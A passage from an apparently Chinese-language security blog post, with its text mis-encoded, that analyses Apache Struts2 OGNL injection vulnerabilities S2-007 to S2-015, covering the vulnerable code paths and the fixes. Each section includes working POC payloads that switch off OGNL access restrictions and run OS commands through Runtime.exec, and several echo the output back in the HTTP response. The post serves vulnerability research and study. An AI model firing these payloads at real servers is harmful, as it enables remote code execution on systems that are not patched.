<p>xwork&gt;=2.2.3ï¼Œognlè¡¨è¾¾å¼è®¡ç®—æ—¶ï¼Œè°ƒç”¨å‡½æ•°çš„å‡½æ•°åˆ¤æ–­<code>isAcceptableProperty</code>å¦‚æœnameä¸ºnullç›´æ¥è¿”å›trueï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ç”¨åƒs2-005é‚£æ ·æŠŠ<code>excludeProperties</code>ç½®ä¸ºç©ºé›†åˆã€‚</p>
<p><img src="/assets/talk_about_struts2/image-20200509120444634.png" alt="image-20200509120444634"></p>
<p>ä½†æ˜¯ä»è¿™é‡Œå¼€å§‹ï¼Œ<code>allowStaticMethodAccess</code>é»˜è®¤ä¸ºfalseï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶ç½®ä¸ºtrueï¼Œæ‰èƒ½æ­£å¸¸æ‰§è¡Œé™æ€å‡½æ•°ã€‚</p>
<p>æ‰€ä»¥POCç¬¬ä¸€äºŒå¥éƒ½æ˜¯åœ¨è§£é™¤é™åˆ¶ï¼Œç¬¬ä¸‰å¥æ‰§è¡Œå‘½ä»¤</p>
<p>å†™ä¸€ä¸‹å›æ˜¾çš„POC</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+ (</span></span><br><span class="line"><span class="string">#_memberAccess.allowStaticMethodAccess=true,</span></span><br><span class="line"><span class="string">#context['</span>xwork.MethodAccessor.denyMethodExecution<span class="string">']=false,</span></span><br><span class="line"><span class="string">#ret=@java.lang.Runtime@getRuntime().exec('</span>id<span class="string">'),</span></span><br><span class="line"><span class="string">#isr=new java.io.InputStreamReader(#ret.getInputStream()),</span></span><br><span class="line"><span class="string">#br=new java.io.BufferedReader(#isr),</span></span><br><span class="line"><span class="string">#res=new char[2000],</span></span><br><span class="line"><span class="string">#br.read(#res),</span></span><br><span class="line"><span class="string">#writer=#context['</span>com.opensymphony.xwork2.dispatcher.HttpServletResponse<span class="string">'].getWriter(),</span></span><br><span class="line"><span class="string">#writer.println(new java.lang.String(#res)),</span></span><br><span class="line"><span class="string">#writer.flush(),</span></span><br><span class="line"><span class="string">#writer.close()</span></span><br><span class="line"><span class="string">) +'</span></span><br></pre></td></tr></table></figure>
<h2 id="5-S2-008"><a href="#5-S2-008" class="headerlink" title="5. S2-008"></a>5. S2-008</h2><p>S2-008ä¸€å…±æœ‰4ä¸ªæ¼æ´ï¼Œè¯¦ç»†çœ‹<a href="https://cwiki.apache.org/confluence/display/WW/S2-008" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-008</a></p>
<p>å…¶ä¸­1è·ŸS2-007ç±»ä¼¼ï¼Œ3ä¸çœ‹äº†ï¼Œä¸»è¦å…³æ³¨2å’Œ4</p>
<h3 id="CookieInterceptor"><a href="#CookieInterceptor" class="headerlink" title="CookieInterceptor"></a>CookieInterceptor</h3><p>è¿™é‡Œçš„åŸç†åŒS2-005ç±»ä¼¼ï¼Œè¿™é‡Œçœ‹ä»£ç æ¯”è¾ƒç›´è§‚ï¼Œæ²¡æœ‰æ­ç¯å¢ƒè°ƒäº†</p>
<p><code>org.apache.struts2.interceptor.CookieInterceptor#intercept</code></p>
<p><img src="/assets/talk_about_struts2/image-20200509202547849.png" alt="image-20200509202547849"></p>
<p><img src="/assets/talk_about_struts2/image-20200509202741614.png" alt="image-20200509202741614"></p>
<p>è¿™é‡Œä¼šåˆ°<code>OgnlValueStack.setValue</code>ï¼Œä¹Ÿå°±æ˜¯åç»­è°ƒç”¨<code>Ognl.setValue</code>ï¼Œç”¨<code>((1)(2))(3)</code>çš„æ–¹å¼æ¥æ‰§è¡Œä»»æ„OGNLè¡¨è¾¾å¼</p>
<h3 id="DebuggingInterceptor"><a href="#DebuggingInterceptor" class="headerlink" title="DebuggingInterceptor"></a>DebuggingInterceptor</h3><p><img src="/assets/talk_about_struts2/image-20200509204915751.png" alt="image-20200509204915751"></p>
<p>å½“å¼€å¯å¼€å‘è€…æ¨¡å¼æ—¶ï¼Œä¼ å…¥<code>debug=command&amp;expression=xxxx</code>ï¼Œå³å¯æ‰§è¡ŒOGNLè¡¨è¾¾å¼</p>
<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open /System/Applications/Calculator.app'</span>))</span><br><span class="line"><span class="comment">// å›æ˜¾POC</span></span><br><span class="line">(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>),%<span class="number">23</span>isr=<span class="keyword">new</span> java.io.InputStreamReader(%<span class="number">23</span>ret.getInputStream()),%<span class="number">23</span>br=<span class="keyword">new</span> java.io.BufferedReader(%<span class="number">23</span>isr),%<span class="number">23</span>res=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2000</span>],%<span class="number">23</span>br.read(%<span class="number">23</span>res),<span class="keyword">new</span> java.lang.String(%<span class="number">23</span>res))</span><br></pre></td></tr></table></figure>
<h2 id="6-S2-009"><a href="#6-S2-009" class="headerlink" title="6. S2-009"></a>6. <a href="https://cwiki.apache.org/confluence/display/WW/S2-009" target="_blank" rel="noopener">S2-009</a></h2><p>å½±å“èŒƒå›´ï¼š2.0.0 - 2.3.1.1</p>
<p>é’ˆå¯¹S2-005çš„ä¿®å¤ï¼Œå¯¹å‚æ•°åš<code>[a-zA-Z0-9\\.\\]\\[\\(\\)_&#39;\\s]+</code>æ­£åˆ™æ£€æŸ¥ï¼Œè¿™é‡Œè§„é¿äº†å‚æ•°åä¸­å‡ºç°<code>#</code>ã€unicodeç¼–ç ç­‰</p>
<p>S2-009æ˜¯å¯¹S2-005çš„ç»•è¿‡ï¼Œè¿™é‡Œç”¨çš„å°±æ˜¯<code>Ognl.setValue</code>å‡½æ•°çš„å¦ä¸€ç§ç”¨æ³•<code>a[(1)(2)]</code>ï¼Œè¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå·§å¦™çš„æ˜¯ï¼Œå‰é¢çš„å‡ ä¸ªæ¼æ´åˆ©ç”¨ï¼Œæˆ‘ä»¬éƒ½æ˜¯ç›´æ¥åœ¨<code>(1)</code>å†™ä¸Šè¦æ‰§è¡Œçš„OGNLè¡¨è¾¾å¼ï¼Œè€ŒS2-009åˆ™é€šè¿‡contexté‡Œçš„å†…å®¹æ¥è¿›è¡Œä¸€ä¸ªä¸­è½¬ï¼Œå°†OGNLè¡¨è¾¾å¼æ”¾åˆ°<code>key=value</code>çš„valueçš„ä½ç½®ï¼Œå†ç”±<code>a[(key)(2)]</code>çš„æ–¹å¼å»æ‰§è¡Œvalueçš„å†…å®¹ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">context.put(<span class="string">"test"</span>,<span class="string">"@java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app/\')"</span>); <span class="comment">// å‡è®¾contextå­˜åœ¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„OGNLè¡¨è¾¾å¼test</span></span><br><span class="line">Ognl.setValue(<span class="string">"a[(test)(bla)]"</span>,context,<span class="string">""</span>);<span class="comment">// ä»¥a[(test)(bla)],æ‰§è¡Œtestæ‰€ä»£è¡¨çš„OGNLè¡¨è¾¾å¼</span></span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢ä»£ç ä¸­çš„å‡è®¾ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥<code>?param=xxx</code>çš„æ–¹å¼å¸¦å…¥</p>
<p>æ³¨æ„è¿™é‡Œçš„paraméœ€è¦æ˜¯å½“å‰Actionçš„ä¸€ä¸ªç±»å±æ€§ï¼ˆä¹Ÿå°±æ˜¯åŸæœ¬å°±å­˜åœ¨çš„å‚æ•°åï¼‰ï¼Œæ¯”å¦‚åŸæœ¬è¡¨å•é‡Œå°±æœ‰passwordï¼Œé‚£ä¹ˆä½ å°±å¯ä»¥åœ¨passwordé‡Œé¢å¡«å……OGNLè¡¨è¾¾å¼</p>
<p>å› ä¸ºåœ¨è®¡ç®—OGNLè¡¨è¾¾å¼<code>(password)(bla)</code>çš„æ—¶å€™(è§£æå‡ºä¸¤ä¸ªASTProperty)</p>
<p><img src="/assets/talk_about_struts2/image-20200511171450014.png" alt="image-20200511171450014"></p>
<p>åç»­å†æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šå»æŸ¥æ‰¾å½“å‰çš„actioné‡Œé¢æ˜¯å¦å«æœ‰è¿™ä¸ªå±æ€§</p>
<p><img src="/assets/talk_about_struts2/image-20200511171056619.png" alt="image-20200511171056619"></p>
<p><code>com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor#getProperty</code></p>
<p><img src="/assets/talk_about_struts2/image-20200511204523185.png" alt="image-20200511204523185"></p>
<p>å¦‚æœå½“å‰å­˜åœ¨è¿™ä¸ªå±æ€§çš„æ—¶å€™ï¼Œè¿”å›å…¶å†…å®¹</p>
<p>åç»­å°±æ˜¯è·Ÿ<code>(1)(2)</code>è¿™ç§æ‰§è¡Œçš„åŸç†ä¸€æ ·ï¼Œä¼šä»¥<code>(1)</code>ä½œä¸ºnodeè°ƒç”¨getValueã€‚</p>
<p>è¿™é‡Œå·§å¦™çš„å°±æ˜¯åˆ©ç”¨è¿™ç§ä¸­è½¬çš„æ–¹å¼ï¼Œè§„é¿äº†å‚æ•°åçš„æ­£åˆ™æ£€æµ‹</p>
<h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?password=(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open /System/Applications/Calculator.app'</span>))&amp;z[(password)(bla)]=<span class="number">1</span></span><br><span class="line"><span class="comment">// å›æ˜¾POC</span></span><br><span class="line">?password=(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>),%<span class="number">23</span>isr=<span class="keyword">new</span> java.io.InputStreamReader(%<span class="number">23</span>ret.getInputStream()),%<span class="number">23</span>br=<span class="keyword">new</span> java.io.BufferedReader(%<span class="number">23</span>isr),%<span class="number">23</span>res=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2000</span>],%<span class="number">23</span>br.read(%<span class="number">23</span>res),%<span class="number">23</span>writer=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse</span>().getWriter(),%<span class="number">23</span>writer.println(<span class="keyword">new</span> java.lang.String(%<span class="number">23</span>res)),%<span class="number">23</span>writer.flush(),%<span class="number">23</span>writer.close())&amp;z[(password)(bla)]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="ä¿®å¤-3"><a href="#ä¿®å¤-3" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>æ”¹è¿›äº†æ­£åˆ™</p>
<p><img src="/assets/talk_about_struts2/image-20200511222139049.png" alt="image-20200511222139049"></p>
<p>å¢åŠ äº†<code>setParameter</code>å‡½æ•°ï¼Œé»˜è®¤è®¾ç½®è¡¨è¾¾å¼ä¸å¯æ‰§è¡Œ</p>
<p><img src="/assets/talk_about_struts2/image-20200511223638532.png" alt="image-20200511223638532"></p>
<p><img src="/assets/talk_about_struts2/image-20200519154216690.png" alt="image-20200519154216690"></p>
<h2 id="7-S2-012"><a href="#7-S2-012" class="headerlink" title="7. S2-012"></a>7. S2-012</h2><p>å½±å“èŒƒå›´ï¼šStruts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2</p>
<blockquote>
<p>The second evaluation happens when redirect result reads it from the stack and uses the previously injected code as redirect parameter.<br>This lets malicious users put arbitrary OGNL statements into any unsanitized String variable exposed by an action and have it evaluated as an OGNL expression to enable method execution and execute arbitrary methods, bypassing Struts and OGNL library protections.</p>
</blockquote>
<p>çœ‹æè¿°å¯ä»¥çŸ¥é“æ˜¯struts2åœ¨å¤„ç†redirectçš„æ—¶å€™å‡ºç°çš„é—®é¢˜ã€‚</p>
<p><img src="/assets/talk_about_struts2/image-20200513145252050.png" alt="image-20200513145252050"></p>
<p><img src="/assets/talk_about_struts2/image-20200513145417046.png" alt="image-20200513145417046"></p>
<p>ç»“æœè¿”å›åå›å»è°ƒç”¨<code>ServletRedirectResult</code>æ¥å¤„ç†</p>
<p>æ¥çœ‹çœ‹è¯¥å¯¹è±¡çš„å®é™…å¤„ç†å‡½æ•°<code>org.apache.struts2.dispatcher.ServletRedirectResult#execute</code></p>
<p><img src="/assets/talk_about_struts2/image-20200513145546225.png" alt="image-20200513145546225"></p>
<p><img src="/assets/talk_about_struts2/image-20200513150115678.png" alt="image-20200513150115678"></p>
<p>åœ¨çˆ¶ç±»executeå‡½æ•°è°ƒç”¨äº†<code>conditionalParse</code>å‡½æ•°</p>
<p><img src="/assets/talk_about_struts2/image-20200513150240332.png" alt="image-20200513150240332"></p>
<p>è¿™é‡Œå‡ºç°äº†æˆ‘ä»¬æ¯”è¾ƒç†Ÿæ‚‰çš„<code>TextParseUtil.translateVariables</code>ï¼ŒS2-001å°±æ˜¯ç”±è¿™ä¸ªå‡½æ•°æ¥å¤„ç†Stringç±»å‹è½¬åŒ–çš„ã€‚</p>
<p>æ­¤æ—¶paramä¸ºæˆ‘ä»¬åœ¨struts.xmlä¸­çš„é…ç½®<code>edit.action?skillName=${currentSkill.name}</code></p>
<p>å‰é¢åˆ†æè¿‡<code>translateVariables</code>ï¼Œè¿™é‡Œç›´åˆ‡ä¸»é¢˜</p>
<p>å‡ºé—®é¢˜çš„åœ°æ–¹è·ŸS2-001ä¸€æ ·</p>
<p><img src="/assets/talk_about_struts2/image-20200513151342610.png" alt="image-20200513151342610"></p>
<p>è§¦å‘æ€»å…±åˆ†ä¸ºä¸¤æ­¥ï¼š</p>
<ol>
<li><p>å°†xmlé…ç½®ä¸­<code>${currentSkill.name}</code>è§£ææˆä¼ å…¥çš„å€¼ï¼Œæ­¤æ—¶stack.findValueä¼šå»æ‰¾åˆ°å‰é¢å¤„ç†å¥½åçš„Resulté‡Œé¢çš„currentSkill.nameçš„å€¼</p>
<p><img src="/assets/talk_about_struts2/image-20200513151651915.png" alt="image-20200513151651915"></p>
</li>
<li><p>ç”±äº<code>translateVariables</code>çš„è§£æOGNLè¡¨è¾¾å¼æœ‰ä¸¤ç§<code>$</code>ã€<code>%</code>ï¼Œå¹¶ä¸”æ˜¯å¾ªç¯å»å¤„ç†çš„</p>
<p><img src="/assets/talk_about_struts2/image-20200513151842698.png" alt="image-20200513151842698"></p>
<p>é¦–å…ˆæ˜¯å»å¤„ç†<code>$</code>ï¼Œå°†<code>${currentSkill.name}</code>è§£ææˆå…·ä½“çš„å€¼ï¼Œå¹¶ä¸”å°†resultçš„å€¼ç½®ä¸ºä»–çš„å†…å®¹</p>
<p>è™½ç„¶å·²ç»ä¿®å¤äº†å¾ªç¯é€’å½’æ‰§è¡Œçš„é—®é¢˜(s2-001ä¼šæ‰§è¡Œä¸¤å±‚<code>${}</code>)ï¼Œä½†æ˜¯å› ä¸ºè¿˜å¾ªç¯å»å¤„ç†<code>%</code>ï¼Œé‚£ä¹ˆä»ç„¶å¯ä»¥è¾¾åˆ°å¾ªç¯é€’å½’è®¡ç®—çš„æ•ˆæœ<code>${å¦ä¸€å±‚ä»¥%èµ·å§‹çš„ognlè¡¨è¾¾å¼}</code>ï¼Œæ‰€ä»¥POCé‡Œé¢éœ€è¦ç”¨<code>%{}</code>æ¥å†™å…¥OGNLè¡¨è¾¾å¼</p>
</li>
</ol>
<p>æ‰€ä»¥å¯¹äºS2-012æ¥è¯´ï¼Œé…ç½®ä¸­<code>${currentSkill.name}</code>æ˜¯è‡³å…³é‡è¦çš„</p>
<h3 id="ä¿®å¤-4"><a href="#ä¿®å¤-4" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>ç”±äºæˆ‘å‰é¢åˆ†æçš„æ˜¯<code>2.2.3</code>ç‰ˆæœ¬ï¼Œåç»­çš„ç‰ˆæœ¬çš„<code>translateVariables</code>å˜åŒ–æœ‰ç‚¹å¤§ï¼Œå…¶ä¿®å¤ç‰ˆæœ¬</p>
<p><img src="/assets/talk_about_struts2/image-20200513155116772.png" alt="image-20200513155116772"></p>
<p>å¢åŠ äº†posæ¥åšèµ·å§‹ä½ç½®æ¥æŸ¥æ‰¾<code>${}%{}</code>ï¼Œåœ¨ç¬¬ä¸€æ¬¡è¡¨è¾¾å¼æ‰§è¡Œå®Œæˆåä¼šæ›´æ–°poså€¼ï¼Œæ¥é˜²æ­¢äºŒæ¬¡OGNLè¡¨è¾¾å¼æ‰§è¡Œ</p>
<h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">currentSkill.name=%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,@java.lang.Runtime@getRuntime().exec(&apos;open /System/Applications/Calculator.app&apos;))&#125;</span><br><span class="line">// å›æ˜¾POC</span><br><span class="line">%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#ret=@java.lang.Runtime@getRuntime().exec(&apos;id&apos;),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close())&#125;</span><br></pre></td></tr></table></figure>
<h2 id="8-S2-013-S2-014"><a href="#8-S2-013-S2-014" class="headerlink" title="8. S2-013/S2-014"></a>8. S2-013/S2-014</h2><p>å½±å“èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.3.14.1</p>
<p>è¿™æ¬¡çš„åŸç†è·ŸS2-001ç±»ä¼¼ï¼Œåªæ˜¯é—®é¢˜å‡ºåœ¨è§£æ<code>&lt;s:a&gt;</code>ã€<code>&lt;s:url&gt;</code>ï¼Œå½“è¿™ä¸¤ä¸ªæ ‡ç­¾æ”¯æŒ<code>includeParams</code></p>
<p><img src="/assets/talk_about_struts2/image-20200514151446611.png" alt="image-20200514151446611"></p>
<p>å½“å½“å‰çš„hrefä¸ºç©ºæ—¶ï¼Œä¼šç”¨å½“å‰urlæ¥å¡«å……hrefï¼Œä¹Ÿå°±æ˜¯åœ¨<code>buildUrl</code>æ—¶å¯¼è‡´çš„OGNLè¡¨è¾¾å¼çš„æ‰§è¡Œ</p>
<p>è¿™é‡Œä¸å…·ä½“åˆ†æäº†ï¼Œçœ‹ä¸€ä¸‹ä»–çš„æ‰§è¡Œæ ˆ</p>
<p><img src="/assets/talk_about_struts2/image-20200514150911888.png" alt="image-20200514150911888" style="zoom:50%;"></p>
<p><code>org.apache.struts2.views.util.DefaultUrlHelper#translateVariable</code></p>
<p><img src="/assets/talk_about_struts2/image-20200514151844894.png" alt="image-20200514151844894"></p>
<p>ä¹ŸåŒæ ·æ˜¯ä½¿ç”¨Stringè½¬æ¢æ—¶å‡ºç°çš„OGNLè¡¨è¾¾å¼æ‰§è¡Œ</p>
<h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?fakeParam=%&#123;(%<span class="number">23</span>_memberAccess[<span class="string">'allowStaticMethodAccess'</span>]=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open /System/Applications/Calculator.app'</span>))&#125;</span><br><span class="line"><span class="comment">// å›æ˜¾POC</span></span><br><span class="line">?fakeParam=%&#123;(%<span class="number">23</span>_memberAccess[<span class="string">'allowStaticMethodAccess'</span>]=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>),%<span class="number">23</span>isr=<span class="keyword">new</span> java.io.InputStreamReader(%<span class="number">23</span>ret.getInputStream()),%<span class="number">23</span>br=<span class="keyword">new</span> java.io.BufferedReader(%<span class="number">23</span>isr),%<span class="number">23</span>res=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2000</span>],%<span class="number">23</span>br.read(%<span class="number">23</span>res),%<span class="number">23</span>writer=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse</span>().getWriter(),%<span class="number">23</span>writer.println(<span class="keyword">new</span> java.lang.String(%<span class="number">23</span>res)),%<span class="number">23</span>writer.flush(),%<span class="number">23</span>writer.close())&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ä¿®å¤-5"><a href="#ä¿®å¤-5" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p><img src="/assets/talk_about_struts2/image-20200514152500049.png" alt="image-20200514152500049"></p>
<p><img src="/assets/talk_about_struts2/image-20200514152517255.png" alt="image-20200514152517255"></p>
<p>è¿™é‡Œ<code>org.apache.struts2.views.util.DefaultUrlHelper</code>ä¸å†ä½¿ç”¨TextParseUtilæ¥å¤„ç†</p>
<h2 id="9-S2-015"><a href="#9-S2-015" class="headerlink" title="9. S2-015"></a>9. S2-015</h2><p>å½±å“èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.3.14.2</p>
<p>S2-015ä¸€å…±æœ‰ä¸¤ç§ï¼š</p>
<p>ç¬¬ä¸€ç§æ¼æ´åŸç†è·ŸS2-012ç±»ä¼¼ï¼Œè¿™æ¬¡é—®é¢˜ä¸æ˜¯å‡ºåœ¨é‡å®šå‘ï¼Œè€Œæ˜¯åœ¨è§£æå…·ä½“çš„action nameæ—¶å‡ºç°çš„é—®é¢˜</p>
<p><img src="/assets/talk_about_struts2/image-20200514165546294.png" alt="image-20200514165546294"></p>
<p>è¿™é‡Œçš„<code>{1}</code>ä¼šè¢«æ›¿æ¢æˆ<code>xxx.action</code>çš„<code>xxx</code>ï¼Œè¿™é‡Œçš„<code>xxx</code>å¦‚æœè¢«æˆ‘ä»¬æ›¿æ¢æˆOGNLè¡¨è¾¾å¼ï¼Œä¼šåœ¨åç»­çš„<code>TextParseUtil.translateVariables</code>å¾—åˆ°æ‰§è¡Œï¼Œè¿‡ç¨‹è·ŸS2-012ä¸€æ ·ï¼Œä¸å†å™è¿°ã€‚</p>
<p>ç¬¬äºŒç§æ˜¯ç»“æœç”±httpheaderæ¥å¤„ç†æ—¶ï¼Œä¼šå°†æˆ‘ä»¬çš„<code>${message}</code>åµŒå¥—æ‰§è¡Œ</p>
<p><img src="/assets/talk_about_struts2/image-20200514202040764.png" alt="image-20200514202040764"></p>
<p><code>org.apache.struts2.dispatcher.HttpHeaderResult#execute</code></p>
<p><img src="/assets/talk_about_struts2/image-20200514202919865.png" alt="image-20200514202919865"></p>
<p>è·ŸS2-012ä¸€æ ·ï¼Œè§£ææ‰§è¡Œ<code>${å¦ä¸€å±‚ä»¥%èµ·å§‹çš„OGNLè¡¨è¾¾å¼}</code></p>
<h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// æ‘˜è‡ªhttps://www.freebuf.com/vuls/217482.html</span><br><span class="line">%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ifconfig%27%29.getInputStream%28%29%29%2C%23q%7D.action</span><br><span class="line">// ç¬¬äºŒç§</span><br><span class="line">ï¼Ÿmessage=%&#123;#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#m=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;ifconfig&apos;).getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ¯”è¾ƒç‰¹æ®Šçš„æ˜¯è¿™é‡Œå¯¹åŸæœ‰<code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true</code>ï¼Œæ”¹æˆäº†</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åŸæ¥çš„æ–¹å¼</span></span><br><span class="line">#_memberAccess['allowStaticMethodAccess']=true</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡åå°„æœºåˆ¶æ¥è®¾ç½®#_memberAccess['allowStaticMethodAccess']</span></span><br><span class="line">#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),</span><br><span class="line">#m.setAccessible(true),</span><br><span class="line">#m.set(#_memberAccess,true)</span><br></pre></td></tr></table></figure>
<p>ä¸ºä»€ä¹ˆè¦é€šè¿‡è¿™ç§æ–¹å¼æ¥å†™å…¥å‘¢ï¼Ÿ</p>
<p>å…ˆæ¥çœ‹OGNLæ˜¯æ€ä¹ˆsetValueçš„</p>
<p><code>ognl.OgnlRuntime#setFieldValue</code></p>
<p><img src="/assets/talk_about_struts2/image-20200514173311368.png" alt="image-20200514173311368"></p>
<p>è€Œæ­¤æ—¶è¿™é‡Œæˆ‘ä»¬è¦è®¾ç½®çš„<code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]</code></p>
<p><img src="/assets/talk_about_struts2/image-20200514173631503.png" alt="image-20200514173631503"></p>
<p>æ˜¯finalç±»å‹ï¼Œæˆ‘ä»¬ä¸èƒ½ä½¿ç”¨æ™®é€šçš„æ–¹å¼æ”¹å˜ä»–çš„å€¼ï¼Œåªèƒ½é€šè¿‡ä¸Šé¢çš„åå°„çš„æ–¹å¼æ¥è¿›è¡Œä¿®æ”¹ã€‚</p>
<p>è¿™é‡Œçš„æ”¹å˜æ˜¯ä»struts2 2.3.14.1ç‰ˆæœ¬å¼€å§‹çš„ï¼Œæ„å‘³ç€é«˜äºè¿™ä¸ªç‰ˆæœ¬çš„ä»¥åçš„pocåªèƒ½é€šè¿‡è¿™ç§æ–¹å¼æ¥è®¾ç½®</p>
<p>é™¤äº†ä¸Šé¢é€šè¿‡åå°„æœºåˆ¶æ¥è¿›è¡Œç»•è¿‡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨æ„é€ å™¨çš„æ–¹æ³•æ¥æ‰§è¡Œï¼Œæ¯”å¦‚<code>new ProccessBuilder(&#39;id&#39;).start()</code></p>
<h3 id="ä¿®å¤-6"><a href="#ä¿®å¤-6" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>è¿™é‡Œçš„ä¿®å¤å°±æ˜¯S2-012çš„ä¿®å¤ï¼Œä¸»è¦ä¿®å¤äº†æ‰§è¡Œè¿™ç§OGNLè¡¨è¾¾å¼<code>${å¦ä¸€å±‚%èµ·å§‹çš„OGNLè¡¨è¾¾å¼}</code></p>
<h2 id="10-S2-016"><a href="#10-S2-016" class="headerlink" title="10. S2-016"></a>10. S2-016</h2><p>èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.3.15</p>
